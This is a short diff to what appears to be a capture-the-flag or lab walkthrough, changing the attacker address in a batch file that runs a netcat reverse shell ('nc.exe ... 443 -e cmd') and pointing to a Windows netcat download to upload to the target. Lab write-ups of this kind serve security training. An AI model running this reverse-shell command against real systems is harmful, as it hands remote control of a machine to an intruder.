@@ -322,7 +322,7 @@ Enable Modules
 Contents of `shell.bat`
 ```CSS
 @echo off
-\programdata\nc.exe 10.10.14.14 443 -e cmd
+\programdata\nc.exe 10.10.14.4 443 -e cmd
 ```
 Get netcat for windows from `https://github.com/int0x33/nc.exe/raw/master/nc64.exe`.
 Upload to target
